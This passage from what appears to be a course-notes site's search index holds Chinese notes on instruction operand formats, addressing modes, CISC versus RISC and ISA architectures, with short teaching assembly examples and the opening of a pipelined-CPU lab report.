\u4e09\u64cd\u4f5c\u6570\u7684\u6307\u4ee4\u4f18\u70b9\u662f\u53ef\u4ee5\u5f88\u7075\u6d3b\u5730\u6307\u5b9a\u7ed3\u679c\u5b58\u653e\u5728\u54ea\u91cc\uff0c\u8ba1\u7b97\u8868\u8fbe\u5f0f\u7684\u7a0b\u5e8f\u5f88\u77ed\uff0c\u7f3a\u70b9\u662f\u4e8c\u8fdb\u5236\u7f16\u7801\u6307\u4ee4\u65f6\u9700\u8981\u7528\u8f83\u591a\u4f4d\u6570\u6765\u6307\u5b9a\u4e09\u4e2a\u5730\u5740</p>"},{"location":"cs/system/cs1/topic5/#_10","title":"\u4e8c\u64cd\u4f5c\u6570\u6307\u4ee4","text":"<p>\u538b\u7f29\u76ee\u7684\u64cd\u4f5c\u6570\u5230\u6e90\u64cd\u4f5c\u6570\uff0c\u4e5f\u5c31\u662f\u7528\u4e00\u4e2a\u6e90\u64cd\u4f5c\u6570\u540c\u65f6\u4ee3\u8868\u76ee\u7684 <pre><code>SUB A, B    ; A &lt;- A - B\nMUL D, E    ; D &lt;- D * E\nADD D, C    ; D &lt;- D + C\nDIV A, D    ; A &lt;- A / D\n</code></pre> \u4f46\u662f\u8fd9\u6837\u4f1a\u66f4\u6539 ABCDE \u539f\u6765\u7684\u503c\uff0c\u6240\u4ee5\u9700\u8981\u901a\u8fc7 MOV \u7c7b\u6307\u4ee4\u6765\u6682\u5b58\u7528\u505a\u8ba1\u7b97\uff1a <pre><code>MOV R1, A\nMOV R2, D\nSUB R1, B\nMUL R2, E\nADD R2, C\nDIV R1, R2\n</code></pre> \u6240\u4ee5\u5b83\u4f1a\u6bd4\u4e09\u64cd\u4f5c\u6570\u6307\u4ee4\u7684\u6307\u4ee4\u6761\u6570\u66f4\u591a</p>"},{"location":"cs/system/cs1/topic5/#_11","title":"\u4e00\u64cd\u4f5c\u6570\u6307\u4ee4","text":"<p>\u53ef\u4ee5\u901a\u8fc7\u7ee7\u7eed\u9690\u85cf\u4e00\u4e2a\u64cd\u4f5c\u6570\u7684\u65b9\u6cd5\u6765\u6784\u9020\u51fa\u4e00\u64cd\u4f5c\u6570\u7684\u6307\u4ee4\uff0c\u6bd4\u5982\u89c4\u5b9a\u8fd0\u7b97\u4e2d\u7684\u4e00\u4e2a\u64cd\u4f5c\u6570\u548c\u76ee\u7684\u90fd\u4e3a Acc\uff08\u7d2f\u52a0\u5668\uff09 <pre><code>LDA D   ; Acc &lt;- D\nMUL E   ; Acc &lt;- Acc * E\nADD C   ; Acc &lt;- Acc + C\nSTO R1  ; R1 &lt;- Acc\nLDA A   ; Acc &lt;- A\nSUB B   ; Acc &lt;- Acc - B\nDIV R1  ; Acc &lt;- Acc / R1\n</code></pre> \u8fd9\u6837\u6307\u4ee4\u6761\u6570\u4f1a\u66f4\u591a\uff0c\u4f46\u662f CPU \u5374\u66f4\u5bb9\u6613\u8bbe\u8ba1</p>"},{"location":"cs/system/cs1/topic5/#_12","title":"\u96f6\u64cd\u4f5c\u6570\u6307\u4ee4","text":"<p>\u56e0\u4e3a\u662f\u96f6\u64cd\u4f5c\u6570\uff0c\u6240\u4ee5\u6307\u4ee4\u8fd0\u7b97\u4e2d\u7684\u4e09\u4e2a\u5730\u5740\u90fd\u662f\u9690\u5f0f\u7684\uff0c\u53ef\u4ee5\u4f7f\u7528\u6808\u6765\u64cd\u4f5c\uff0c\u5373\u6bcf\u6b21\u8fd0\u7b97\u53d6\u51fa\u6808\u9876\u4e24\u4e2a\u5143\u7d20\u7136\u540e\u8fd0\u7b97\u540e\u5c06\u7ed3\u679c\u538b\u56de\u6808\u4e2d <pre><code>PUSH B  ; B\nPUSH A  ; B, A\nSUB     ; A-B\nPUSH E  ; A-B, E\nPUSH D  ; A-B, E, D\nMUL     ; A-B, D*E\nPUSH C  ; A-B, D*E, C\nADD     ; A-B, C+D*E\nDIV     ; (A-B)/(C+D*E)\n</code></pre></p> <p>\u53ef\u89c1\u64cd\u4f5c\u6570\u8d8a\u591a\uff0c\u6307\u4ee4\u8d8a\u590d\u6742\u4f46\u7a0b\u5e8f\u5305\u542b\u7684\u6307\u4ee4\u6761\u6570\u5c11\uff1b\u64cd\u4f5c\u6570\u8d8a\u591a\uff0c\u6307\u4ee4\u8d8a\u7b80\u5355\uff0c\u6307\u4ee4\u6267\u884c\u8d8a\u5feb\uff0c\u4f46\u7a0b\u5e8f\u5305\u542b\u7684\u6307\u4ee4\u6761\u6570\u4e5f\u4f1a\u8d8a\u591a</p>"},{"location":"cs/system/cs1/topic5/#_13","title":"\u5bfb\u5740\u6a21\u5f0f","text":"<p>\u5728\u6307\u4ee4\u6267\u884c\u7684\u8fc7\u7a0b\u4e2d\uff0c\u5982\u4f55\u83b7\u53d6\u64cd\u4f5c\u6570\u53d6\u51b3\u4e8e\u6307\u4ee4\u7684\u5bfb\u5740\u6a21\u5f0f\u3002\u5bfb\u5740\u6a21\u5f0f\u6307\u5b9a\u4e86\u4e00\u4e2a\u5728\u5b9e\u9645\u8bbf\u95ee\u64cd\u4f5c\u6570\u4e4b\u524d\uff0c\u89e3\u91ca\u6216\u8c03\u6574\u6307\u4ee4\u5730\u5740\u5b57\u6bb5\u7684\u89c4\u5219\uff0c\u7528\u8fd9\u4e2a\u89c4\u5219\u53ef\u4ee5\u751f\u6210\u64cd\u4f5c\u6570\u7684\u6709\u6548\u5730\u5740\uff08effective address\uff09\u3002</p> <p>\u5bfb\u5740\u6a21\u5f0f\u53ef\u4ee5\u6307\u5b9a\u5230\u5e38\u6570\u3001\u5bc4\u5b58\u5668\u548c\u5185\u5b58\u5730\u5740\u3002\u9ad8\u6548\u7684\u5bfb\u5740\u6a21\u5f0f\u8bbe\u8ba1\u53ef\u4ee5\u51cf\u5c11\u6307\u4ee4\u7684\u957f\u5ea6\u3002\u4e0b\u9762\u662f\u4e00\u4e9b\u5e38\u89c1\u7684\u5bfb\u5740\u6a21\u5f0f</p>"},{"location":"cs/system/cs1/topic5/#_14","title":"\u7acb\u5373\u6570\u5bfb\u5740","text":"<p>\u7acb\u5373\u6570\u5bfb\u5740\uff08immediate addressing\uff09\u5373\u64cd\u4f5c\u6570\u5c31\u5728\u6307\u4ee4\u5f53\u4e2d\uff0c\u4e5f\u5c31\u662f\u6307\u4ee4\u4e2d\u6709\u4e00\u4e2a\u64cd\u4f5c\u6570\u5b57\u6bb5\u5c31\u4ee3\u8868\u4e86\u8fd9\u4e2a\u5e38\u6570\u672c\u8eab\u800c\u4e0d\u662f\u5730\u5740\u3002</p>"},{"location":"cs/system/cs1/topic5/#_15","title":"\u76f4\u63a5\u5bfb\u5740","text":"<p>\u76f4\u63a5\u5bfb\u5740\uff08direct addressing\uff09\u5373\u64cd\u4f5c\u6570\u4f5c\u4e3a\u5185\u5b58\u5730\u5740\uff0c\u76f4\u63a5\u8bfb\u53d6\u8be5\u5730\u5740\u5904\u7684\u503c\u8fdb\u884c\u64cd\u4f5c\uff0c\u4e5f\u5c31\u662f\u6307\u4ee4\u4e2d\u6709 ADRS\uff0c\u4f46\u5b9e\u9645\u7528\u7684\u662f M[ADRS]</p> <p>\u8fd9\u5c31\u6709\u4e86\u4e00\u4e2a\u95ee\u9898\uff0c\u5982\u679c\u662f 32 \u4f4d\u7684\u5730\u5740\uff0c\u6307\u4ee4\u4e5f\u662f 32 \u4f4d\u7684\uff0c\u4e0d\u80fd\u653e\u4e0b\u5b8c\u6574\u7684\u5730\u5740\uff0c\u6240\u4ee5\u4e00\u822c\u4f7f\u7528\u6bb5\u5730\u5740\u548c\u504f\u79fb\u5730\u5740\u914d\u5408\uff0c\u9690\u542b\u4e00\u4e2a\u6bb5\u5730\u5740\uff0c\u7136\u540e ADRS \u4ec5\u4f7f\u7528\u504f\u79fb\u5730\u5740\u3002\u4f46\u662f\u76f4\u63a5\u5bfb\u5740\u9700\u8981\u5728\u6c47\u7f16\u7684\u65f6\u5019\u5c31\u77e5\u9053\u51c6\u786e\u7684\u5730\u5740\u4f4d\u7f6e</p> <p>\u76f4\u63a5\u5bfb\u5740\u7684\u5730\u5740\u4e5f\u53ef\u4ee5\u4ee3\u8868\u4e00\u4e2a\u5bc4\u5b58\u5668</p>"},{"location":"cs/system/cs1/topic5/#_16","title":"\u95f4\u63a5\u5bfb\u5740","text":"<p>\u95f4\u63a5\u5bfb\u5740\uff08indire addressing\uff09\u5373\u64cd\u4f5c\u6570\u4e2d\u5305\u542b\u5185\u5b58\u5730\u5740\uff0c\u8fd9\u4e2a\u5185\u5b58\u5730\u5740\u5904\u7684\u503c\u8fd8\u662f\u4e00\u4e2a\u5730\u5740\uff0c\u8fd9\u4e2a\u5730\u5740\u6240\u6307\u5411\u7684\u4f4d\u7f6e\u662f\u5b9e\u9645\u8981\u7528\u7684\u6570\u3002\u4e5f\u5c31\u662f\u6307\u4ee4\u4e2d\u6709 ADRS\uff0c\u4f46\u5b9e\u9645\u7528\u7684\u662f M[M[ADRS]]</p> <p>ADRS \u5fc5\u987b\u5728\u6c47\u7f16\u7684\u65f6\u5019\u56fa\u5b9a\uff0c\u4f46\u662f ADRS \u6240\u6307\u5411\u7684\u4f4d\u7f6e\u53ef\u4ee5\u662f\u53d8\u5316\u7684\uff0c\u8fd9\u6837\u53ef\u4ee5\u4f7f\u8bbf\u95ee\u6570\u7ec4\u8fd9\u6837\u7684\u64cd\u4f5c\u53d8\u5f97\u66f4\u65b9\u4fbf</p> <p>ADRS \u4e5f\u53ef\u4ee5\u662f\u4e00\u4e2a\u5bc4\u5b58\u5668</p>"},{"location":"cs/system/cs1/topic5/#_17","title":"\u53d8\u5740\u5bfb\u5740\u4e0e\u57fa\u5740\u5bfb\u5740","text":"<p>\u4e8c\u8005\u5f88\u76f8\u4f3c\uff0c\u90fd\u662f\u5c06\u5bc4\u5b58\u5668\u503c\u4e0e\u5730\u5740\u52a0\u8d77\u6765\u7684\u548c\u4f5c\u4e3a\u5b9e\u9645\u8981\u8bbf\u95ee\u7684\u5730\u5740</p> <ul> <li>\u53d8\u5740\u5bfb\u5740\uff08indexed addressing\uff09\uff0c\u5bc4\u5b58\u5668\u4fdd\u5b58\u7684\u662f\u504f\u79fb\u5730\u5740\uff0c\u6307\u4ee4\u4e2d\u5730\u5740\u4fdd\u5b58\u7684\u662f\u57fa\u5730\u5740</li> <li>\u57fa\u5740\u5bfb\u5740\uff08based addressing\uff09\uff0c\u5bc4\u5b58\u5668\u4fdd\u5b58\u7684\u662f\u57fa\u5730\u5740\uff0c\u6307\u4ee4\u4e2d\u5730\u5740\u662f\u504f\u79fb\u5730\u5740</li> </ul> <p>\u603b\u7ed3\uff1a</p> \u5bfb\u5740\u6a21\u5f0f \u8868\u793a\u6cd5 \u542b\u4e49 \u7acb\u5373\u6570\u5bfb\u5740 #K K \u76f4\u63a5\u5bfb\u5740 K M[K] \u95f4\u63a5\u5bfb\u5740 (K) M[M[K]] \u5bc4\u5b58\u5668\u5bfb\u5740 (Rn) M[Rn] \u5bc4\u5b58\u5668\u53d8\u5740\u5bfb\u5740 (Rm+Rn) M[Rm+Rn] \u5bc4\u5b58\u5668\u57fa\u5740\u5bfb\u5740 (Rm+X) M[Rm+X] \u5bc4\u5b58\u5668\u57fa\u5740\u53d8\u5740\u5bfb\u5740 (Rm+Rn+X) M[Rm+Rn+X]"},{"location":"cs/system/cs1/topic5/#_18","title":"\u64cd\u4f5c\u7c7b\u578b\u53ca\u7f16\u7801","text":""},{"location":"cs/system/cs1/topic5/#_19","title":"\u64cd\u4f5c\u7c7b\u578b","text":"<p>\u4e00\u822c\u7684\u6307\u4ee4\u96c6\u90fd\u5305\u542b\u4e0b\u9762\u8fd9\u4e9b\u79cd\u64cd\u4f5c\u7c7b\u578b\uff1a</p> <ul> <li>\u7b97\u6570\u8fd0\u7b97\u3001\u903b\u8f91\u8fd0\u7b97</li> <li>\u79fb\u4f4d\u8fd0\u7b97</li> <li>\u6570\u636e\u4f20\u9001\uff08MOV/LOAD/STORE \u4e4b\u7c7b\uff09</li> <li>\u5b57\u7b26\u4e32\u8fd0\u7b97</li> <li>\u63a7\u5236\u6d41\u53d8\u5316\uff08BRANCH/JMP/CALL/RET \u7b49\uff09</li> <li>\u7cfb\u7edf\u6307\u4ee4\uff08HALT/INT \u7b49\uff09</li> <li>\u8f93\u5165\u8f93\u51fa</li> <li>...</li> </ul>"},{"location":"cs/system/cs1/topic5/#_20","title":"\u6307\u4ee4\u7f16\u7801","text":"<p>\u6307\u4ee4\u7f16\u7801\u7684\u957f\u5ea6\u6709\u51e0\u79cd</p> <ul> <li>\u53d8\u957f\uff08Variable\uff09\uff1a\u6bcf\u6761\u6307\u4ee4\u7684\u957f\u5ea6\u90fd\u4e0d\u4e00\u5b9a</li> <li>\u5b9a\u957f\uff08Fixed\uff09\uff1a\u6240\u6709\u6307\u4ee4\u90fd\u662f\u540c\u4e00\u957f\u5ea6</li> <li>\u6df7\u5408\uff08Hybrid\uff09\uff1a\u6709\u591a\u79cd\u6307\u4ee4\u7684\u957f\u5ea6</li> </ul> <p>\u4e00\u822c\u5982\u679c\u4ee3\u7801\u7684\u5927\u5c0f\u6700\u91cd\u8981\u7684\u8bdd\u9009\u62e9\u53d8\u957f\u6307\u4ee4\uff0c\u5982\u679c\u662f\u6267\u884c\u8868\u73b0\u6700\u91cd\u8981\u7684\u8bdd\u9009\u62e9\u5b9a\u957f\u6307\u4ee4\u3002\u800c\u4e00\u4e9b\u4e3a\u4e86\u517c\u5bb9\uff0c\u53ef\u80fd\u4f1a\u9009\u62e9\u6df7\u5408\u957f\u5ea6\u6307\u4ee4</p>"},{"location":"cs/system/cs1/topic5/#risc-cisc","title":"RISC \u4e0e CISC","text":""},{"location":"cs/system/cs1/topic5/#cisc","title":"CISC","text":"<p>CISC\uff08Complex Instruction Set Computer\uff09\u5373\u590d\u6742\u6307\u4ee4\u96c6\u8ba1\u7b97\u673a</p> <ul> <li>\u7f16\u7a0b\u548c\u6267\u884c\u4e4b\u95f4\u7684\u8bed\u4e49\u95f4\u9694\uff08semantic gap\uff09\u5c0f</li> <li>\u7a0b\u5e8f\u673a\u5668\u7801\u4f53\u79ef\u5c0f</li> <li>\u7f16\u8bd1\u8fc7\u7a0b\u7b80\u5355</li> </ul> <p>CISC \u7c7b\u578b\u7684\u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784\u6709 x86\u3001Intel 432\u3001IBM 360\u3001DEC VAX \u7b49</p>"},{"location":"cs/system/cs1/topic5/#risc","title":"RISC","text":"<p>RISC\uff08Reduced Instruction Set Computer\uff09\u5373\u7cbe\u7b80\u6307\u4ee4\u96c6\u8ba1\u7b97\u673a</p> <ul> <li>\u7531 IBM \u53d1\u660e</li> <li>RISC \u7684\u6307\u4ee4\u5f88\u5c11\uff0c\u800c\u4e14\u6bcf\u4e2a\u6307\u4ee4\u7b80\u5355\uff0c\u957f\u5ea6\u56fa\u5b9a</li> <li>CISC \u6bcf\u589e\u52a0\u4e00\u4e2a\u6307\u4ee4\u90fd\u4f1a\u4f7f\u89e3\u7801\u53d8\u6162\uff0c\u4ece\u800c\u4f7f\u6574\u4e2a ISA \u90fd\u4f1a\u53d8\u6162\uff0c\u4f46 RISC \u4e0d\u4f1a</li> <li>\u8fd0\u7b97\u7684\u64cd\u4f5c\u6570\u90fd\u662f\u5bc4\u5b58\u5668\uff08reg-reg\uff09</li> <li>\u7f16\u8bd1\u4f1a\u66f4\u590d\u6742</li> </ul> <p>RISC \u7c7b\u578b\u7684\u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784\u6709 RISC I\u3001RISC II\u3001MIPS\u3001ARM\u3001RISC V \u7b49</p> <p>CISC \u4e0e RISC \u533a\u522b\uff1a</p> CISC RISC \u53d8\u957f\u6307\u4ee4 \u5b9a\u957f\u6307\u4ee4 \u5927\u91cf\u6307\u4ee4\u548c\u5bfb\u5740\u6a21\u5f0f \u6307\u4ee4\u548c\u5bfb\u5740\u6a21\u5f0f\u90fd\u5f88\u5c11 \u7f16\u7801\u957f\u3001\u590d\u6742 \u7f16\u7801\u7b80\u5355 \u5305\u542b\u4ece\u5185\u5b58\u5230\u5185\u5b58\u7684\u64cd\u4f5c \u53ea\u80fd\u5b58/\u53d6 \u4f7f\u7528\u5fae\u6307\u4ee4 \u6ca1\u6709\u5fae\u6307\u4ee4\uff0c\u4e00\u5207\u90fd\u76f4\u63a5\u4ece\u6307\u4ee4\u4e2d\u89e3\u7801\u51fa\u6765 \u8bed\u4e49\u95f4\u9694\u5c0f \u9700\u8981\u66f4\u667a\u80fd\u7684\u7f16\u8bd1\u5668 <p>CISC \u548c RISC \u5728\u53d1\u5c55\u4e2d\u4e5f\u4e0d\u5e94\u5b8c\u5168\u5272\u88c2</p>"},{"location":"cs/system/cs1/topic5/#_21","title":"\u5bfb\u5740\u7ed3\u6784","text":"<p>\u5bfb\u5740\u7ed3\u6784\u6709\u51e0\u79cd\uff1a</p> <ul> <li>\u7d2f\u52a0\u5668\u7ed3\u6784\uff0cAccumulator\uff081960 \u524d\uff0c\u5982 68HC11\uff09</li> <li>\u6808\u7ed3\u6784\uff0cStack\uff081960s ~ 1970s\uff09</li> <li>\u5b58\u50a8\u5668\u5230\u5b58\u50a8\u5668\u7ed3\u6784\uff0cMemory-Memory\uff081970s ~ 1980s\uff09</li> <li>\u5bc4\u5b58\u5668\u5230\u5b58\u50a8\u5668\u7ed3\u6784\uff0cRegister-Memory\uff081970s \u81f3\u4eca\uff0c\u5982 x86\uff09</li> <li>\u5bc4\u5b58\u5668\u5230\u5bc4\u5b58\u5668\u7ed3\u6784\uff0cRegister-Register\uff081960s \u81f3\u4eca\uff0c\u5982 MIPS\uff09\uff0c\u53c8\u79f0\u88c5\u8f7d/\u5b58\u50a8\u7ed3\u6784\uff08Load/Store\uff09</li> </ul> <p></p>"},{"location":"cs/system/cs1/topic5/#_22","title":"\u6808\u7ed3\u6784","text":"<ul> <li>ALU \u8fd0\u7b97\u6ca1\u6709\u64cd\u4f5c\u6570\uff0cpush/pop \u6709\u4e00\u4e2a\u64cd\u4f5c\u6570</li> <li>\u4f18\u70b9<ul> <li>\u6307\u4ee4\u77ed</li> <li>\u786c\u4ef6\u8981\u6c42\u4f4e</li> <li>\u7f16\u8bd1\u5668\u597d\u5199</li> </ul> </li> <li>\u7f3a\u70b9<ul> <li>\u6548\u7387\u4f4e</li> <li>\u6808\u7a7a\u95f4\u6709\u9650</li> <li>\u5e76\u884c\u6216\u6d41\u6c34\u7ebf\u80fd\u529b\u5f31</li> <li>\u7f16\u8bd1\u5668\u96be\u4f18\u5316</li> </ul> </li> <li>\u4f8b\u5b50\uff1a60 \u5e74\u4ee3\u7684 B5500/6500 HP3000/70\uff0c\u73b0\u5728\u7684 Java \u865a\u62df\u673a</li> </ul>"},{"location":"cs/system/cs1/topic5/#_23","title":"\u7d2f\u52a0\u5668\u7ed3\u6784","text":"<ul> <li>\u4f7f\u7528\u5355\u4e2a\u64cd\u4f5c\u6570\uff08\u4e00\u4e2a\u663e\u5f0f\u4e00\u4e2a\u9690\u542b\uff09</li> <li>\u6307\u4ee4\u6709 ALU \u8fd0\u7b97\u3001\u52a0\u8f7d\u5230\u7d2f\u52a0\u5668\u3001\u4ece\u7d2f\u52a0\u5668\u8f93\u51fa\u5230\u5b58\u50a8\u5668</li> <li>\u4f18\u70b9<ul> <li>\u786c\u4ef6\u8981\u6c42\u6781\u4f4e</li> <li>\u6613\u4e8e\u8bbe\u8ba1\u3001\u7406\u89e3</li> </ul> </li> <li>\u7f3a\u70b9<ul> <li>\u7d2f\u52a0\u5668\u6210\u4e3a\u74f6\u9888</li> <li>\u5e76\u884c/\u6d41\u6c34\u7ebf\u80fd\u529b\u5f31</li> <li>\u9700\u8981\u7684 load store \u5f88\u591a\uff0c\u5185\u5b58\u8bfb\u5199\u9891\u7e41</li> </ul> </li> <li>\u4f8b\u5b50\uff1a\u65e9\u671f IBM 7090 \u7b49\uff0c\u73b0\u5728\u7684 DSP \u7ed3\u6784</li> </ul>"},{"location":"cs/system/cs1/topic5/#_24","title":"\u5b58\u50a8\u5668\u5230\u5b58\u50a8\u5668\u7ed3\u6784","text":"<ul> <li>\u6240\u6709\u7684 ALU \u8fd0\u7b97\u90fd\u4ece\u5b58\u50a8\u5668\u8bfb\u5199</li> <li>\u4f18\u70b9<ul> <li>\u65e0\u9700\u4f7f\u7528\u5bc4\u5b58\u5668</li> <li>\u9700\u8981\u7684\u6307\u4ee4\u6570\u91cf\u5c11</li> <li>\u5bb9\u6613\u5199\u7f16\u8bd1\u5668</li> </ul> </li> <li>\u7f3a\u70b9<ul> <li>\u6307\u4ee4\u957f\u5ea6\u53d8\u5316\u5927</li> <li>\u6bcf\u6761\u6307\u4ee4\u6267\u884c\u7684\u65f6\u95f4\u6d6e\u52a8\u4e5f\u5927</li> <li>\u5de8\u5927\u7684\u5b58\u50a8\u5668\u8bfb\u5199\u5bfc\u81f4\u6548\u7387\u4f4e</li> </ul> </li> <li>\u4f8b\u5b50\uff1aVAX</li> </ul>"},{"location":"cs/system/cs1/topic5/#_25","title":"\u5bc4\u5b58\u5668\u5230\u5b58\u50a8\u5668\u7ed3\u6784","text":"<ul> <li>ALU \u64cd\u4f5c\u4e2d\u6709\u4e00\u4e2a\u5b58\u50a8\u5668</li> <li>\u4e00\u822c\u6307\u4ee4\u6709\u4e24\u4e2a\u64cd\u4f5c\u6570</li> <li>\u4f18\u70b9<ul> <li>\u6307\u4ee4\u6570\u91cf\u5c11</li> <li>\u6307\u4ee4\u6613\u4e8e\u7f16\u89e3\u7801</li> </ul> </li> <li>\u7f3a\u70b9<ul> <li>\u8fd0\u7b97\u7ed3\u679c\u4f1a\u8986\u76d6\u539f\u503c</li> <li>\u6307\u4ee4\u957f\u5ea6\u53d8\u5316\u5927</li> <li>\u6307\u4ee4\u8fd0\u884c\u65f6\u95f4\u53d8\u5316\u5927</li> <li>\u53ef\u80fd\u4f1a\u9650\u5236\u5bc4\u5b58\u5668\u4e2a\u6570</li> </ul> </li> <li>\u4f8b\u5b50\uff1aIBM 360/370\u3001VAX</li> </ul>"},{"location":"cs/system/cs1/topic5/#_26","title":"\u88c5\u8f7d/\u5b58\u50a8\u7ed3\u6784","text":"<ul> <li>ALU \u6307\u4ee4\u4e2d\u4e0d\u9700\u8981\u5b58\u50a8\u5668</li> <li>\u4e00\u822c\u6307\u4ee4\u6709\u4e09\u4e2a\u64cd\u4f5c\u6570</li> <li>\u4f18\u70b9<ul> <li>\u7b80\u5355\u3001\u5b9a\u957f\u7684\u6307\u4ee4\u7f16\u7801</li> <li>\u6307\u4ee4\u8fd0\u884c\u7684\u65f6\u95f4\u53d8\u5316\u5c0f</li> <li>\u6613\u4e8e\u8fdb\u884c\u6d41\u6c34\u7ebf</li> </ul> </li> <li>\u7f3a\u70b9<ul> <li>\u6307\u4ee4\u4e2a\u6570\u591a</li> <li>\u5e76\u4e0d\u662f\u6240\u6709\u64cd\u4f5c\u90fd\u6709\u4e09\u4e2a\u64cd\u4f5c\u6570</li> <li>\u9700\u8981\u66f4\u597d\u7684\u7f16\u8bd1\u5668</li> </ul> </li> <li>\u4f8b\u5b50\uff1aCDC6600\u3001CRAY-1\u3001\u5927\u90e8\u5206 RISC</li> </ul> <p>\u5bc4\u5b58\u5668\u7684\u4f18\u7f3a\u70b9</p> <ul> <li>\u4f18\u70b9<ul> <li>\u6bd4\u5b58\u50a8\u5668\u8bfb\u5199\u66f4\u5feb</li> <li>\u66f4\u660e\u786e</li> <li>\u9700\u8981\u66f4\u5c11\u6bd4\u7279\u5c31\u80fd\u5b9a\u4f4d\u4f7f\u7528\u54ea\u4e2a\u5bc4\u5b58\u5668</li> <li>\u8282\u7701\u5185\u5b58\u8bfb\u5199</li> </ul> </li> <li>\u7f3a\u70b9<ul> <li>\u5728\u8fdb\u884c\u8fc7\u7a0b\u8c03\u7528\u7684\u65f6\u5019\u9700\u8981\u4fdd\u62a4\u5bc4\u5b58\u5668\uff08\u5b58\u50a8/\u6062\u590d\uff09</li> <li>\u4e0d\u80fd\u53d6\u4e00\u4e2a\u5bc4\u5b58\u5668\u7684\u5730\u5740</li> <li>\u5bc4\u5b58\u5668\u53ef\u5b58\u50a8\u7684\u957f\u5ea6\u56fa\u5b9a</li> <li>\u7f16\u8bd1\u5668\u9700\u8981\u66f4\u597d\u7684\u7ba1\u7406\u5bc4\u5b58\u5668</li> <li>\u5bc4\u5b58\u5668\u4e2a\u6570\u6709\u9650</li> </ul> </li> </ul>"},{"location":"cs/system/cs1/topic5/#risc-v-isa","title":"RISC-V ISA","text":"<p>\u89c1 RISC-V ISA</p>"},{"location":"cs/system/cs1/topic6/","title":"\u5904\u7406\u5668","text":"<p> \u7ea6 19 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4\u4e0d\u5230 1 \u5206\u949f</p> <p>Abstract</p> <p>\u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 \u7b2c\u5341\u4e09\uff5e\uff1f\u5468\u8bfe\u7a0b\u5185\u5bb9</p> <p>\u53c2\u8003\uff1a</p>"},{"location":"cs/system/cs2/","title":"\u8ba1\u7b97\u673a\u7cfb\u7edf \u2161","text":"<p>Abstract</p> <p>\u6d59\u6c5f\u5927\u5b66 \u201c\u8ba1\u7b97\u673a\u7cfb\u7edf \u2161\u201d \u8bfe\u7a0b\u76f8\u5173\u77e5\u8bc6\u7b14\u8bb0</p> <p>\u5173\u4e8e \u8ba1\u7b97\u673a\u7cfb\u7edf \u2161\uff1a \u00a0\u00a0\u8bfe\u7a0b\u53f7\uff1a21121840 \u00a0\u00a0\u4fe1\u606f\u5b89\u5168\u4e13\u4e1a\u5fc5\u4fee\u8bfe \u00a0\u00a0\u5305\u542b\u5e38\u89c4\u610f\u4e49\u4e0a\u7684 \u8ba1\u7b97\u673a\u7ec4\u6210\u4e0e\u8bbe\u8ba1 \u548c \u64cd\u4f5c\u7cfb\u7edf \u4e24\u95e8\u8bfe\u7684\u90e8\u5206\u5185\u5bb9 \u00a0\u00a0\u56fe\u7075\u73ed\u8bfe\u7a0b\u5b66\u4e60\u6307\u5357\uff1a\u8ba1\u7b97\u673a\u7cfb\u7edf \u2161</p>"},{"location":"cs/system/cs2/#table-of-contents","title":"Table of Contents","text":"<ul> <li>\u7406\u8bba\u90e8\u5206<ul> <li>\u6d41\u6c34\u7ebf CPU</li> <li>\u64cd\u4f5c\u7cfb\u7edf\u7b80\u4ecb</li> <li>\u64cd\u4f5c\u7cfb\u7edf\u7ed3\u6784\u53ca\u7cfb\u7edf\u8c03\u7528</li> <li>\u8fdb\u7a0b\u4e0e\u7ebf\u7a0b</li> <li>CPU \u8c03\u5ea6</li> <li>\u8fdb\u7a0b\u540c\u6b65</li> </ul> </li> <li>\u5b9e\u9a8c\u90e8\u5206<ul> <li>lab1: \u6d41\u6c34\u7ebf CPU \u8bbe\u8ba1</li> <li>lab2: \u6d41\u6c34\u7ebf\u5192\u9669\u5904\u7406</li> <li>lab3: GDB+QEMU \u8c03\u8bd5 64 \u4f4d RISC-V LINUX</li> <li>lab4: RV64 \u5185\u6838\u5f15\u5bfc</li> <li>lab5: RV64 \u65f6\u949f\u4e2d\u65ad\u5904\u7406</li> <li>lab6: RV64 \u5185\u6838\u7ebf\u7a0b\u8c03\u5ea6</li> <li>lab7: \u7efc\u5408\u5b9e\u9a8c\uff08\u7279\u6743\u7ea7 CPU\uff09</li> </ul> </li> </ul>"},{"location":"cs/system/cs2/lab1/","title":"\u6d41\u6c34\u7ebf CPU \u8bbe\u8ba1","text":"<p> \u7ea6 2965 \u4e2a\u5b57  180 \u884c\u4ee3\u7801  9 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 12 \u5206\u949f</p> <p>Abstract</p> <p>\u8ba1\u7b97\u673a\u7cfb\u7edf \u2161 lab1 \u5b9e\u9a8c\u62a5\u544a\uff082022.09.22 ~ 2022.10.13\uff09</p> <p>Warning</p> <p>\u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad</p>"},{"location":"cs/system/cs2/lab1/#_1","title":"\u5b9e\u9a8c\u5185\u5bb9","text":"<ul> <li>lab 1-1\uff1a\u6d41\u6c34\u7ebf\u52a0\u6cd5\u673a<ul> <li>\u57fa\u4e8e lab 0 \u7684\u5355\u5468\u671f CPU \u642d\u5efa\u6d41\u6c34\u7ebf\u52a0\u6cd5\u673a\uff0c\u652f\u6301 addi \u548c nop \u6307\u4ee4</li> <li>\u8fdb\u884c\u4eff\u771f\u6d4b\u8bd5\uff0c\u68c0\u9a8c CPU \u57fa\u672c\u529f\u80fd</li> <li>\u8fdb\u884c\u4e0a\u677f\u6d4b\u8bd5\uff0c\u68c0\u9a8c CPU \u8bbe\u8ba1\u89c4\u8303</li> <li>\u601d\u8003\u9898<ol> <li>\u5bf9\u4e8e part1 (2-14 \u884c)\uff0c\u8bf7\u8ba1\u7b97\u4f60\u7684 CPU \u7684 CPI\uff0c\u518d\u7528 lab0 \u7684\u5355\u5468\u671f CPU \u8fd0\u884c part1\uff0c\u5bf9\u6bd4\u4e8c\u8005\u7684 CPI</li> <li>\u5bf9\u4e8e part2 (24-39 \u884c)\uff0c\u8bf7\u8ba1\u7b97\u4f60\u7684 CPU \u7684 CPI\uff08\u5047\u8bbe nop \u4e0d\u8ba1\u5165\u6307\u4ee4\u6761\u6570\uff09\uff0c\u518d\u7528 lab0 \u7684\u5355\u5468\u671f CPU \u8fd0\u884c part2\uff0c\u5bf9\u6bd4\u4e8c\u8005\u7684 